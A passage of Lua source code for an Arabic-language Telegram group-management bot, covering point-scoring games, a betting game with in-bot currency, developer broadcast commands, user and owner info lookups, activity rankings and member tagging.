ballancee = redis:get(bot_id.."boob"..msg.sender.user_id) or 0
gampoin = ballancee + 1
redis:set(bot_id.."boob"..msg.sender.user_id , gampoin)
local Num = redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game") or 0
return bot.sendText(msg.chat_id,msg.id,"\n• كفو اجابتك صح \n• تم اضافة لك نقطة\n• نقاطك الان : "..Num.."\n ","md",true)
end
end

if redis:get(bot_id..'Games:Set:Answer'..msg.chat_id) then
if text == ""..(redis:get(bot_id..'Games:Set:Answer'..msg.chat_id) or '66765$47').."" then 
redis:del(bot_id.."Games:Set:Answer"..msg.chat_id)
redis:incrby(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game", 5)  
ballancee = redis:get(bot_id.."boob"..msg.sender.user_id) or 0
gampoin = ballancee + 5
redis:set(bot_id.."boob"..msg.sender.user_id , gampoin)
redis:del(bot_id.."Games:Set:Answer"..msg.chat_id)
local Num = redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game") or 0
return bot.sendText(msg.chat_id,msg.id,"\n• كفو اجابتك صح \n• تم اضافة لك 5 نقاط\n• نقاطك الان : "..Num.." \n","md",true)
end
end

if redis:get(bot_id.."Start_rhan"..msg.chat_id) then
if text and text:match('^انا (.*)$') then
local UserName = text:match('^انا (.*)$')
local coniss = coin(UserName)
ballancee = redis:get(bot_id.."boob"..msg.sender.user_id) or 0
if tonumber(coniss) < 999 then
return bot.sendText(msg.chat_id,msg.id, "↯︙الحد الادنى المسموح هو 1000 دينار 💵\n","md",true)
end
if tonumber(ballancee) < tonumber(coniss) then
return bot.sendText(msg.chat_id,msg.id, "↯︙فلوسك ماتكفي \n","md",true)
end
if redis:sismember(bot_id..'List_rhan'..msg.chat_id,msg.sender.user_id) then
return bot.sendText(msg.chat_id,msg.id,'• انت مضاف من قبل .',"md",true)
end
redis:set(bot_id.."playerrhan"..msg.chat_id,msg.sender.user_id)
redis:set(bot_id.."playercoins"..msg.chat_id..msg.sender.user_id,coniss)
redis:sadd(bot_id..'List_rhan'..msg.chat_id,msg.sender.user_id)
redis:setex(bot_id.."Witting_Startrhan"..msg.chat_id,1400,true)
benrahan = redis:get(bot_id.."allrhan"..msg.chat_id..12345) or 0
rehan = tonumber(benrahan) + tonumber(coniss)
redis:set(bot_id.."allrhan"..msg.chat_id..12345 , rehan)
local ballancee = redis:get(bot_id.."boob"..msg.sender.user_id) or 0
rehan = tonumber(ballancee) - tonumber(coniss)
redis:set(bot_id.."boob"..msg.sender.user_id , rehan)
return bot.sendText(msg.chat_id,msg.id,'• تم ضفتك للرهان \n• للانتهاء يرسل ( نعم ) اللي بدء الرهان .',"md",true)
end
end

if redis:get(bot_id.."Start_Ahkam"..msg.chat_id) then
if text == "انا" then
if redis:sismember(bot_id..'List_Ahkam'..msg.chat_id,msg.sender.user_id) then
return bot.sendText(msg.chat_id,msg.id,'• انت مضاف من قبل .',"md",true)
end
redis:sadd(bot_id..'List_Ahkam'..msg.chat_id,msg.sender.user_id)
redis:setex(bot_id.."Witting_StartGameh"..msg.chat_id,1400,true)
return bot.sendText(msg.chat_id,msg.id,'• تم ضفتك للعبة \n• للانتهاء يرسل نعم اللي بدء اللعبة .',"md",true)
end
end

if redis:get(bot_id.."Start_Ahkamm"..msg.chat_id) then
if text == "انا" then
if redis:sismember(bot_id..'List_Ahkamm'..msg.chat_id,msg.sender.user_id) then
return bot.sendText(msg.chat_id,msg.id,'• انت مضاف من قبل .',"md",true)
end
redis:sadd(bot_id..'List_Ahkamm'..msg.chat_id,msg.sender.user_id)
redis:setex(bot_id.."Witting_StartGamehh"..msg.chat_id,1400,true)
return bot.sendText(msg.chat_id,msg.id,'• تم ضفتك للعبة \n• للانتهاء يرسل نعم اللي بدء اللعبة .',"md",true)
end
end

if redis:get(bot_id.."Set_fkk"..msg.chat_id) then
if text == redis:get(bot_id.."Set_fkk"..msg.chat_id) then
redis:del(bot_id.."Set_fkk"..msg.chat_id)
redis:incrby(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game", 1)  
ballancee = redis:get(bot_id.."boob"..msg.sender.user_id) or 0
gampoin = ballancee + 1
redis:set(bot_id.."boob"..msg.sender.user_id , gampoin)
local Num = redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game") or 0
return bot.sendText(msg.chat_id,msg.id,"\n• كفو اجابتك صح \n• تم اضافة لك نقطة\n• نقاطك الان : "..Num.." \n","md",true)
end
end 

if redis:get(bot_id.."Set_trkib"..msg.chat_id) then
if text == redis:get(bot_id.."Set_trkib"..msg.chat_id) then
redis:del(bot_id.."Set_trkib"..msg.chat_id)
redis:incrby(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game", 1)  
ballancee = redis:get(bot_id.."boob"..msg.sender.user_id) or 0
gampoin = ballancee + 1
redis:set(bot_id.."boob"..msg.sender.user_id , gampoin)
local Num = redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game") or 0
return bot.sendText(msg.chat_id,msg.id,"\n• كفو اجابتك صح \n• تم اضافة لك نقطة\n• نقاطك الان : "..Num.."\n ","md",true)
end
end

if redis:get(bot_id.."Game:arkkamm"..msg.chat_id) then
if text == redis:get(bot_id.."Game:arkkamm"..msg.chat_id) then
redis:del(bot_id.."Game:arkkamm"..msg.chat_id)
redis:incrby(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game", 1)  
ballancee = redis:get(bot_id.."boob"..msg.sender.user_id) or 0
gampoin = ballancee + 1
redis:set(bot_id.."boob"..msg.sender.user_id , gampoin)
local Num = redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game") or 0
return bot.sendText(msg.chat_id,msg.id,"\n• كفو اجابتك صح \n• تم اضافة لك نقطة\n• نقاطك الان : "..Num.."\n ","md",true)
end
end

if redis:get(bot_id.."Game:aoismm"..msg.chat_id) then
if text == redis:get(bot_id.."Game:aoismm"..msg.chat_id) then
redis:del(bot_id.."Game:aoismm"..msg.chat_id)
redis:incrby(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game", 1)  
ballancee = redis:get(bot_id.."boob"..msg.sender.user_id) or 0
gampoin = ballancee + 1
redis:set(bot_id.."boob"..msg.sender.user_id , gampoin)
local Num = redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game") or 0
return bot.sendText(msg.chat_id,msg.id,"\n• كفو اجابتك صح \n• تم اضافة لك نقطة\n• نقاطك الان : "..Num.."\n ","md",true)
end
end 

if redis:get(bot_id.."Game:Kokoo"..msg.chat_id) then
if text == redis:get(bot_id.."Game:Kokoo"..msg.chat_id) then
redis:incrby(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game", 1)  
redis:del(bot_id.."Game:Kokoo"..msg.chat_id)
ballancee = redis:get(bot_id.."boob"..msg.sender.user_id) or 0
gampoin = ballancee + 1
redis:set(bot_id.."boob"..msg.sender.user_id , gampoin)
local Num = redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game") or 0
return bot.sendText(msg.chat_id,msg.id,"\n• كفو اجابتك صح \n• تم اضافة لك نقطة\n• نقاطك الان : "..Num.." \n","md",true)
end
end

if redis:get(bot_id.."Game:Countrygof"..msg.chat_id) then
if text == redis:get(bot_id.."Game:Countrygof"..msg.chat_id) then
redis:incrby(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game", 1)  
redis:del(bot_id.."Game:Countrygof"..msg.chat_id)
ballancee = redis:get(bot_id.."boob"..msg.sender.user_id) or 0
gampoin = ballancee + 1
redis:set(bot_id.."boob"..msg.sender.user_id , gampoin)
local Num = redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game") or 0
return bot.sendText(msg.chat_id,msg.id,"\n• كفو اجابتك صح \n• تم اضافة لك نقطة\n• نقاطك الان : "..Num.." \n","md",true)
end
end


if redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game:Estimate") then  
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 20 then
return bot.sendText(msg.chat_id,msg.id,"*• يجب ان لا يكون الرقم المخمن اكبر من ( 20 )\n• خمن رقم بين ( 1 و 20 )*","md",true)  
end 
local GETNUM = redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game:Estimate")
if tonumber(NUM) == tonumber(GETNUM) then
redis:del(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game:SADD")
redis:del(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game:Estimate")
redis:incrby(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game",5)  
return bot.sendText(msg.chat_id,msg.id,"*• خمنت الرقم صح\n• تم اضافة ( 5 ) نقاط لك*\n","md",true)
elseif tonumber(NUM) ~= tonumber(GETNUM) then
redis:incrby(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game:SADD",1)
if tonumber(redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game:SADD")) >= 3 then
redis:del(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game:SADD")
redis:del(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game:Estimate")
return bot.sendText(msg.chat_id,msg.id,"*• خسرت في اللعبه\n• كان الرقم الذي تم تخمينه ( "..GETNUM.." )*","md",true)  
else
return bot.sendText(msg.chat_id,msg.id,"* • تخمينك خطأ\n ارسل رقم من جديد *","md",true)  
end
end
end
end
end



if text == 'القوانين' then
if redis:get(bot_id..":"..msg.chat_id..":Law") then
t = redis:get(bot_id..":"..msg.chat_id..":Law")
else
t = "*• لم يتم وضع القوانين في المجموعة *"
end
bot.sendText(msg.chat_id,msg.id,t,"md", true)
end

if text and text:match('^ذيع بالتثبيت (%d+)$') then
local dedede = text:match('^ذيع بالتثبيت (%d+)$')
if not devB(msg.sender.user_id) then 
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص المطور الاساسي* ',"md",true)  
end
redis:set(bot_id.."dedede","-"..dedede) 
redis:setex(bot_id.."Broad:Group:Pin" .. msg.chat_id .. ":" .. msg.sender.user_id, 600, true) 
bot.sendText(msg.chat_id,msg.id,[[
𖦹 ارسل لي الاذاعة سواء أكانت 
❨ ملف • ملصق • متحركه • صوره
 • فيديو • بصمه الفيديو • بصمه • صوت • رساله ❩
━━━━━━━━━━━
𖦹 للخروج ارسل ( الغاء )
 
]],"md",true)  
return false
end

if text and text:match('^ذيع (%d+)$') then
local dededee = text:match('^ذيع (%d+)$')
if not devB(msg.sender.user_id) then 
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص المطور الاساسي* ',"md",true)  
end
redis:set(bot_id.."dededee","-"..dededee) 
redis:setex(bot_id.."Broad:Group:nor" .. msg.chat_id .. ":" .. msg.sender.user_id, 600, true) 
bot.sendText(msg.chat_id,msg.id,[[
𖦹 ارسل لي الاذاعة سواء أكانت 
❨ ملف • ملصق • متحركه • صوره
 • فيديو • بصمه الفيديو • بصمه • صوت • رساله ❩
━━━━━━━━━━━
𖦹 للخروج ارسل ( الغاء )
 
]],"md",true)  
return false
end

if text and text:match('^تعطيل (%d+)$') then
local dededeq = text:match('^تعطيل (%d+)$')
if not devB(msg.sender.user_id) then 
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص المطور الاساسي* ',"md",true)  
end
redis:set(bot_id.."dededeq","-"..dededeq) 
redis:setex(bot_id.."Broad:Group:off" .. msg.chat_id .. ":" .. msg.sender.user_id, 600, true) 
bot.sendText(msg.chat_id,msg.id,[[
𖦹 اعطني الرسالة لكي ارسلها قبل تعطيل المجموعة لهم
❨ ملف • ملصق • متحركه • صوره
 • فيديو • بصمه الفيديو • بصمه • صوت • رساله ❩
━━━━━━━━━━━
𖦹 للخروج ارسل ( الغاء )
 
]],"md",true)  
return false
end

----------------------------------------------------------------------------------------

if text == 'بوت' then
if redis:get(bot_id.."Status:Reply"..msg.chat_id) then
local NamecBots = {'اسمي القميل ️'..(redis:get(bot_id..":namebot") or "راومو")..' 🤧💓',' عندي اسم تره '..(redis:get(bot_id..":namebot") or "راومو")..'  😒💔','لتكول بوت اسمي '..(redis:get(bot_id..":namebot") or "راومو")..' 😏🤺','فهمنه اني بوت شتريد 💚😑','انت البوت لك 😼💕'}
return bot.sendText(msg.chat_id,msg.id, NamecBots[math.random(#NamecBots)],"md",true)  
end
end
if text == 'رابط الحذف' or text == 'رابط مسح' or text == 'بوت المسح' or text == 'مسح حساب' then 

local Text = "*• روابط مسح جميع برامج التواصل*\n"
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '•  Telegram ',url="https://my.telegram.org/auth?to=delete"},{text = '•  instagram ',url="https://www.instagram.com/accounts/login/?next=/accounts/remove/request/permanent/"}},
{{text = '•  Facebook ',url="https://www.facebook.com/help/deleteaccount"},{text = '•  Snspchat ',url="https://accounts.snapchat.com/accounts/login?continue=https%3A%2F%2Faccounts.snapchat.com%2Faccounts%2Fdeleteaccount"}},
{{text = '‹ ‹ TeAm MeLaNo  ›  › ',url="t.me/QQOQQD"}},
}
https.request("https://api.telegram.org/bot"..Token.."/sendphoto?chat_id=" .. msg.chat_id .. "&photo=https://t.me/QQOQQD&caption=".. URL.escape(Text).."&photo=29&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == "الساعه" or text == "الوقت" then
bot.sendText(msg.chat_id,msg.id,"*• الساعه الان : "..os.date("%I:%M %p").." *","md",true)  
end
if text == "شسمك" or text == "شنو اسمك" then
namet = {"حجي اسمي "..(redis:get(bot_id..":namebot") or "راومو"),"يابه اسمي "..(redis:get(bot_id..":namebot") or "راومو"),"اني لقميل "..(redis:get(bot_id..":namebot") or "راومو"),(redis:get(bot_id..":namebot") or "راومو").." اني"}
bot.sendText(msg.chat_id,msg.id,"*"..namet[math.random(#namet)].."*","md",true)  
end 
if text == "بوت" or text == (redis:get(bot_id..":namebot") or "راومو") then
nameBot = {"ها حبي","ها سيد","كلي سيد","كلبي سيد","نعم تفضل ؟،","محتاج شي","عندي اسم وعيونك"}
bot.sendText(msg.chat_id,msg.id,"*"..nameBot[math.random(#nameBot)].."*","md",true)  
end
if text == "التاريخ" then
bot.sendText(msg.chat_id,msg.id,"*• التاريخ الان : "..os.date("%Y/%m/%d").." *","md",true)  
end
if not redis:get(bot_id..":"..msg.chat_id..":settings:GetBio") then
if text == 'البايو' or text == 'نبذتي' or text =='بايو' then
local Bio = GetBio(msg.sender.user_id)
bot.sendText(msg.chat_id, msg.id, ' ['..Bio..']', 'md',true)  
return false
end
end
if text == 'رفع المنشئ' or text == 'رفع المالك' then
if msg.can_be_deleted_for_all_users == false then
bot.sendText(msg.chat_id,msg.id,"*• البوت لا يمتلك صلاحيه*","md",true)  
return false
end
local info_ = bot.getSupergroupMembers(msg.chat_id, "Administrators", "*", 0, 200)
local list_ = info_.members
for k, v in pairs(list_) do
if info_.members[k].status.luatele == "chatMemberStatusCreator" then
redis:sadd(bot_id..":"..msg.chat_id..":Status:Creator", v.member_id.user_id)
return bot.sendText(msg.chat_id,msg.id,"*• تم "..text.." *","md",true)  
end
end
end
if text == 'المنشئ' or text == 'المالك' then
if msg.can_be_deleted_for_all_users == false then
bot.sendText(msg.chat_id,msg.id,"*• البوت لا يمتلك صلاحيه*","md",true)  
return false
end
local info_ = bot.getSupergroupMembers(msg.chat_id, "Administrators", "*", 0, 200)
local list_ = info_.members
for k, v in pairs(list_) do
if info_.members[k].status.luatele == "chatMemberStatusCreator" then
local UserInfo = bot.getUser(v.member_id.user_id)
if UserInfo.first_name == "" then
bot.sendText(msg.chat_id,msg.id,"*• "..text.." حسابه محذوف*","md",true)  
return false
end
if UserInfo.username and UserInfo.username ~= "" then
t = '['..UserInfo.first_name..'](t.me/'..UserInfo.username..')'
u = '[@'..UserInfo.username..']'
ban = ' '..UserInfo.first_name..' '
else
t = '['..UserInfo.first_name..'](tg://user?id='..UserInfo.id..')'
u = 'لا يوجد'
end
sm = bot.getChatMember(msg.chat_id,UserInfo.id)
if sm.status.custom_title then
if sm.status.custom_title ~= "" then
custom = sm.status.custom_title
else
custom = 'لا يوجد'
end
end
if sm.status.luatele == "chatMemberStatusCreator"  then
gstatus = "المالك الاساسي"
elseif sm.status.luatele == "chatMemberStatusAdministrator" then
gstatus = "المشرف"
else
gstatus = "عضو"
end
local photo = bot.getUserProfilePhotos(UserInfo.id)
if photo.total_count > 0 then
local TestText = "*↯︙Name : *( "..(t).." *)*\n*↯︙User : *( "..(u).." *)*\n*↯︙Bio :* ["..GetBio(UserInfo.id).."]\n"
keyboardd = {}
keyboardd.inline_keyboard = {
{
{text = ban, url = "https://t.me/"..UserInfo.username..""},
},
}
local msg_id = msg.id/2097152/0.5 
https.request("https://api.telegram.org/bot"..Token..'/sendPhoto?chat_id='..msg.chat_id..'&caption='..URL.escape(TestText)..'&photo='..photo.photos[1].sizes[#photo.photos[1].sizes].photo.remote.id..'&reply_to_message_id='..msg_id..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboardd))
else
bot.sendText(msg.chat_id,msg.id,"𖦹 المالك ↦ "..(t).." ","md",true)  
end
end
end
end
if text == 'المطور' or text == 'مطور البوت' or text == 'المبرمج' then
local UserInfo = bot.getUser(sudoid)
if UserInfo.username and UserInfo.username ~= "" then
t = '['..UserInfo.first_name..'](t.me/'..UserInfo.username..')'
ban = ' '..UserInfo.first_name..' '
u = '[@'..UserInfo.username..']'
else
t = '['..UserInfo.first_name..'](tg://user?id='..UserInfo.id..')'
u = 'لا يوجد'
end
local photo = bot.getUserProfilePhotos(UserInfo.id)
if photo.total_count > 0 then
local TestText = "*↯︙Name : *( "..(t).." *)*\n*↯︙User : *( "..(u).." *)*\n*↯︙Bio :* ["..GetBio(UserInfo.id).."]\n "
keyboardd = {}
keyboardd.inline_keyboard = {
{
{text = ban, url = "https://t.me/"..UserInfo.username..""},
},
}
local msg_id = msg.id/2097152/0.5 
https.request("https://api.telegram.org/bot"..Token..'/sendPhoto?chat_id='..msg.chat_id..'&caption='..URL.escape(TestText)..'&photo='..photo.photos[1].sizes[#photo.photos[1].sizes].photo.remote.id..'&reply_to_message_id='..msg_id..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboardd))
else
bot.sendText(msg.chat_id,msg.id,"𖦹 المطور ↦ "..(t).." ","md",true)  
end
end
if text == 'مبرمج السورس' or text == 'مطور السورس' then
local UserId_Info = bot.searchPublicChat("OR_33")
if UserId_Info.id then
local UserInfo = bot.getUser(UserId_Info.id)
if UserInfo.username and UserInfo.username ~= "" then
t = '['..UserInfo.first_name..'](t.me/'..UserInfo.username..')'
ban = ' '..UserInfo.first_name..' '
u = '[@'..UserInfo.username..']'
else
t = '['..UserInfo.first_name..'](tg://user?id='..UserInfo.id..')'
u = 'لا يوجد'
end
local photo = bot.getUserProfilePhotos(UserId_Info.id)
if photo.total_count > 0 then
local TestText = "  *↯︙Name : *( "..(t).." *)*\n*↯︙User : *( "..(u).." *)*\n*↯︙Bio :* ["..GetBio(UserInfo.id).."]\n"
keyboardd = {}
keyboardd.inline_keyboard = {
{
{text = ban, url = "https://t.me/"..UserInfo.username..""},
},
}
local msg_id = msg.id/2097152/0.5 
https.request("https://api.telegram.org/bot"..Token..'/sendPhoto?chat_id='..msg.chat_id..'&caption='..URL.escape(TestText)..'&photo='..photo.photos[1].sizes[#photo.photos[1].sizes].photo.remote.id..'&reply_to_message_id='..msg_id..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboardd))
else
bot.sendText(msg.chat_id,msg.id,"*↯︙الاسم : *( "..(t).." *)*\n*↯︙المعرف : *( "..(u).." *)*\n["..GetBio(UserInfo.id).."]","md",true)  
end
end
end
if Administrator(msg) then
if text == "تثبيت" and msg.reply_to_message_id ~= 0 then
if GetInfoBot(msg).PinMsg == false then
bot.sendText(msg.chat_id,msg.id,'*↯︙ماعندي صلاحية تثبيت الرسائل*',"md",true)  
return false
end
bot.sendText(msg.chat_id,msg.id,"*↯︙تم ثبتت الرسالة*","md",true)
local Rmsg = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
bot.pinChatMessage(msg.chat_id,Rmsg.id,true)
end
end
if text == 'معلوماتي' or text == 'موقعي' or text == 'صلاحياتي' then
local UserInfo = bot.getUser(msg.sender.user_id)
local Statusm = bot.getChatMember(msg.chat_id,msg.sender.user_id).status.luatele
if Statusm == "chatMemberStatusCreator" then
StatusmC = 'منشئ'
elseif Statusm == "chatMemberStatusAdministrator" then
StatusmC = 'مشرف'
else
StatusmC = 'عضو'
end
if StatusmC == 'مشرف' then 
local GetMemberStatus = bot.getChatMember(msg.chat_id,msg.sender.user_id).status
if GetMemberStatus.can_change_info then
change_info = '✔️' else change_info = '❌'
end
if GetMemberStatus.can_delete_messages then
delete_messages = '✔️' else delete_messages = '❌'
end
if GetMemberStatus.can_invite_users then
invite_users = '✔️' else invite_users = '❌'
end
if GetMemberStatus.can_pin_messages then
pin_messages = '✔️' else pin_messages = '❌'
end
if GetMemberStatus.can_restrict_members then
restrict_members = '✔️' else restrict_members = '❌'
end
if GetMemberStatus.can_promote_members then
promote = '✔️' else promote = '❌'
end
if StatusmC == "عضو" then
PermissionsUser = ' '
else
PermissionsUser = '*\n• صلاحياتك هي :\n *━━━━━━━━━━━ *'..'\n• تغيير المعلومات : '..change_info..'\n• تثبيت الرسائل : '..pin_messages..'\n• اضافه مستخدمين : '..invite_users..'\n• مسح الرسائل : '..delete_messages..'\n• حظر المستخدمين : '..restrict_members..'\n• اضافه المشرفين : '..promote..'\n\n*'
end
end
local UserId = msg.sender.user_id
local Get_Rank =(Get_Rank(msg.sender.user_id,msg.chat_id))
local messageC =(redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":message") or 1)
local EditmessageC =(redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Editmessage") or 0)
local Total_ms =Total_message((redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":message") or 1))
if UserInfo.username and UserInfo.username ~= "" then
UserInfousername = '@'..UserInfo.username
else
UserInfousername = 'لا يوجد'
end
bot.sendText(msg.chat_id,msg.id,'\n*iD ↦ '..UserId..'\nuSeR ↦ '..UserInfousername..'\nRank ↦ '..Get_Rank..'\nRanGr ↦ '..StatusmC..'\nMsg ↦ '..messageC..'\nEdiT ↦ '..EditmessageC..'\npOiN ↦ '..Total_ms..'*'..(PermissionsUser or '') ,"md",true) 
end
if not redis:get(bot_id..":"..msg.chat_id..":settings:id") then
if text == "ايدي" and msg.reply_to_message_id == 0 then

local Get_Rank =(Get_Rank(msg.sender.user_id,msg.chat_id))
local messageC =(redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":message") or 1)
local gameC =(redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game") or 0)
local Addedmem =(redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Addedmem") or 0)
local EditmessageC =(redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Editmessage") or 0)
local Total_ms =Total_message((redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":message") or 1))
local photo = bot.getUserProfilePhotos(msg.sender.user_id)
local TotalPhoto = photo.total_count or 0

local UserInfo = bot.getUser(msg.sender.user_id)
local Texting = {
'*↯︙*صورتك فدشي 😘😔❤️',
"*↯︙*صارلك شكد مخليه ",
"*↯︙*وفالله 😔💘",
"*↯︙*كشخه برب 😉💘",
"*↯︙*دغيره شبي هذ 😒",
"*↯︙*عمري الحلوين 💘",
}
local Description = Texting[math.random(#Texting)]
if UserInfo.username and UserInfo.username ~= "" then
UserInfousername ="[@"..UserInfo.username.."]"
else
UserInfousername = 'لا يوجد'
end
if redis:get(bot_id..":"..msg.chat_id..":id") then
theId = redis:get(bot_id..":"..msg.chat_id..":id") 
theId = theId:gsub('#AddMem',Addedmem) 
theId = theId:gsub('#game',gameC) 
theId = theId:gsub('#id',msg.sender.user_id) 
theId = theId:gsub('#username',UserInfousername) 
theId = theId:gsub('#msgs',messageC) 
theId = theId:gsub('#edit',EditmessageC) 
theId = theId:gsub('#stast',Get_Rank) 
theId = theId:gsub('#auto',Total_ms) 
theId = theId:gsub('#Description',Description) 
theId = theId:gsub('#photos',TotalPhoto) 
else
theId = Description.."\n*↯︙الايدي : (* `"..msg.sender.user_id.."`* ) .\n↯︙المعرف :* ( "..UserInfousername.." ) .\n↯︙*الرتبه : (  "..Get_Rank.." ) .\n↯︙تفاعلك : (  "..Total_ms.." ) .\n↯︙عدد الرسائل : ( "..messageC.." ) .\n↯︙عدد السحكات : ( "..EditmessageC.." ) .\n↯︙عدد صورك : ( "..TotalPhoto.."* ) "
end
if redis:get(bot_id..":"..msg.chat_id..":settings:id:ph") then
bot.sendText(msg.chat_id,msg.id,theId,"md",true) 
return false
end
if photo.total_count > 0 then
return bot.sendPhoto(msg.chat_id, msg.id, photo.photos[1].sizes[#photo.photos[1].sizes].photo.remote.id,theId,"md")
else
return bot.sendText(msg.chat_id,msg.id,theId,"md",true) 
end
end
end
if text == "trnd" or text == "الترند" or text == "ترند" then
Info_User = bot.getUser(msg.sender.user_id) 

if Info_User.type.luatele == "userTypeRegular" then

GroupAllRtba = redis:hgetall(bot_id..':User:Count:'..msg.chat_id)

GetAllNames = redis:hgetall(bot_id..':User:Name:'..msg.chat_id)

GroupAllRtbaL = {}

for k,v in pairs(GroupAllRtba) do

table.insert(GroupAllRtbaL,{v,k})

end

Count,Kount,i = 8 , 0 , 1

for _ in pairs(GroupAllRtbaL) do 

Kount = Kount + 1 

end

table.sort(GroupAllRtbaL,function(a, b)

return tonumber(a[1]) > tonumber(b[1]) end)

if Count >= Kount then

Count = Kount 

end

Text = "*↯︙أكثر "..Count.." أعضاء تفاعلاً في المجموعة*\n — — — — — — — — — —\n"

for k,v in ipairs(GroupAllRtbaL) do

if i <= Count then

if i==1 then 

t="🥇"

elseif i==2 then

t="🥈" 

elseif i==3 then

 t="🥉" 

elseif i==4 then

 t="🏅" 

else 

t="🎖" 

end 

Text = Text..i..": ["..(GetAllNames[v[2]] or "خطأ بالاسم").."](tg://user?id="..v[2]..") : < *"..v[1].."* > "..t.."\n"

end

i=i+1

end

return bot.sendText(msg.chat_id,msg.id,Text,"md",true)

end

end
if text == 'تاك' or text == 'منشن' and Administrator(msg) then
local Info = bot.searchChatMembers(msg.chat_id, "*", 200)
local members = Info.members
ls = '\n*• قائمه الاعضاء \n  ━━━━━━━━━━━ *\n'
for k, v in pairs(members) do
local UserInfo = bot.getUser(v.member_id.user_id)
if UserInfo.username and UserInfo.username ~= "" then
ls = ls..'*'..k..' - *@['..UserInfo.username..']\n'
else
ls = ls..'*'..k..' - *['..UserInfo.first_name..'](tg://user?id='..v.member_id.user_id..')\n'
end
end
bot.sendText(msg.chat_id,msg.id,ls,"md",true)  
end

if text == 'تاك ايموجي' or text == 'منشن ايموجي' and Administrator(msg) then
local Info = bot.searchChatMembers(msg.chat_id, "*", 100)
local members = Info.members
ls = '\n*\n━━━━━━━━━ *\n'
for k, v in pairs(members) do
local Textingt = {"❤️", "🧡", "💛", "💚", "💙", "💜", "🖤", "🤍", "🤎", "🙂", "🙃", "😉", "😌", "😍", "🥰", "😘", "😗", "😙", "😚", "😋", "😛", "😝", "😜", "🤪", "🤨", "🧐", "🤓", "😎", "🤩", "🥳", "😏", "😒", "😞", "😟", "😕", "🙁", "😣", "😖", "😫", "😩", "🥺", "😢", "😭", "😤", "😠", "😡", "🤯", "😳", "🥵", "🥶", "😱", "😨", "😰", "😥", "😓", "🤗", "🤔", "🤭", "🤫", "🤥", "😶", "😐", "😑", "😬", "🙄", "😯", "😦", "😧", "😮", "😲", "🥱", "😴", "🤤", "😪", "😵", "🤐", "🥴", "🤢", "🤮", "🤧", "😷", "🤒", "🤕", "🤑", "🤠", "😈", "👹", "👺", "🤡",}
local Descriptiont = Textingt[math.random(#Textingt)]
ls = ls..' ['..Descriptiont..'](tg://user?id='..v.member_id.user_id..')\n'
end
bot.sendText(msg.chat_id,msg.id,ls,"md",true)  
end

if text and text:match('^ايدي @(%S+)$') or text and text:match('^كشف @(%S+)$') then
local UserName = text:match('^ايدي @(%S+)$') or text:match('^كشف @(%S+)$')
local UserId_Info = bot.searchPublicChat(UserName)
if not UserId_Info.id then
bot.sendText(msg.chat_id,msg.id,"*• اليوزر ليس لحساب شخصي تأكد منه*","md",true)  
return false
end
if UserId_Info.type.is_channel == true then
bot.sendText(msg.chat_id,msg.id,"*• اليوزر لقناه او المجموعه تأكد منه*","md",true)  
return false
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
bot.sendText(msg.chat_id,msg.id,"*• عذرا يجب ان تستخدم معرف لحساب شخصي فقط*","md",true)  
return false
end
sm = bot.getChatMember(msg.chat_id,UserId_Info.id)
if sm.status.luatele == "chatMemberStatusCreator"  then
gstatus = "المالك الاساسي"
elseif sm.status.luatele == "chatMemberStatusAdministrator" then
gstatus = "مشرف"
else
gstatus = "عضو"
end
bot.sendText(msg.chat_id,msg.id,"*iD ↦ *"..(UserId_Info.id).." **\n*uSeR ↦ *[@"..(UserName).."] **\n*Rank ↦ * "..(Get_Rank(UserId_Info.id,msg.chat_id)).." **\n*RanGr ↦ * "..(gstatus).." **\n*Msg ↦ * "..(redis:get(bot_id..":"..msg.chat_id..":"..UserId_Info.id..":message") or 1).." **" ,"md",true)  
end
if text == 'ايدي' or text == 'كشف'  and msg.reply_to_message_id ~= 0 then
local Remsg = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = bot.getUser(Remsg.sender.user_id)
if UserInfo.username and UserInfo.username ~= "" then
